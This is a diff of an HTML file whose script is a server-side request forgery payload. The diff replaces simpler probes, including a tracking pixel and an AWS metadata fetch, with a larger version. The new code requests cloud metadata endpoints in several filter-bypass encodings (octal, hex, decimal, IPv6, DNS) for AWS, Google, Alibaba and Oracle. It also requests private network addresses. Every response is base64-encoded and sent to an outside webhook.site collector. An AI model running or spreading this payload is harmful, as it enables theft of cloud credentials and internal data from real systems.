@@ -1,34 +1,60 @@
 <!DOCTYPE html>
 <html>
 <body>
-
-<!-- Ye pehle se kaam kar raha hai: -->
-<img src="https://webhook.site/c0980051-ec3e-4d1d-9ef7-87dc160e8b0c?visit=1" width="1" height="1">
-
-<!-- Ab JS test karo: -->
 <script>
-// Simple ping - JS chala ya nahi
 var h = 'https://webhook.site/c0980051-ec3e-4d1d-9ef7-87dc160e8b0c';
 
-// Test 1 - Basic JS
-fetch(h + '?js=executed');
+// Test 1 - Different metadata endpoints
+var metaUrls = [
+  'http://169.254.169.254/',
+  'http://[::ffff:169.254.169.254]/',  // IPv6 bypass
+  'http://169.254.169.254.nip.io/',    // DNS bypass
+  'http://0251.0376.0251.0376/',       // Octal bypass
+  'http://0xa9fea9fe/',                // Hex bypass
+  'http://2852039166/',                // Decimal bypass
+  'http://169.254.169.254:80/',
+];
 
-// Test 2 - AWS Metadata
-fetch('http://169.254.169.254/latest/meta-data/')
+metaUrls.forEach(function(url) {
+  fetch(url)
   .then(r => r.text())
-  .then(d => fetch(h + '?aws=' + btoa(d)))
-  .catch(e => fetch(h + '?aws_blocked=' + btoa(e.toString())));
+  .then(d => fetch(h + '?success=' + btoa(url) + '&data=' + btoa(d)))
+  .catch(e => fetch(h + '?tried=' + btoa(url)));
+});
 
-// Test 3 - Internal network
-fetch('http://10.0.0.1/')
-  .catch(e => fetch(h + '?internal=blocked'));
+// Test 2 - Cloud provider specific
+var cloudUrls = [
+  'http://metadata.google.internal/',
+  'http://100.100.100.200/',           // Alibaba Cloud
+  'http://192.0.0.192/',              // Oracle Cloud
+];
 
-// Test 4 - K8s
-fetch('http://kubernetes.default.svc/')
+cloudUrls.forEach(function(url) {
+  fetch(url)
   .then(r => r.text())
-  .then(d => fetch(h + '?k8s=' + btoa(d)))
-  .catch(e => fetch(h + '?k8s_blocked=true'));
+  .then(d => fetch(h + '?cloud=' + btoa(url) + '&data=' + btoa(d)))
+  .catch(e => fetch(h + '?cloud_blocked=' + btoa(url)));
+});
+
+// Test 3 - Internal ranges
+var internalUrls = [
+  'http://10.0.0.1/',
+  'http://10.1.0.1/',
+  'http://172.16.0.1/',
+  'http://192.168.1.1/',
+  'http://localhost/',
+  'http://127.0.0.1/',
+  'http://0.0.0.0/',
+];
+
+internalUrls.forEach(function(url) {
+  fetch(url)
+  .then(r => r.text())
+  .then(d => fetch(h + '?internal_hit=' + btoa(url) + '&data=' + btoa(d)))
+  .catch(e => {}); // Silent fail
+});
+
+fetch(h + '?status=all_tests_fired');
 </script>
-
 </body>
 </html>
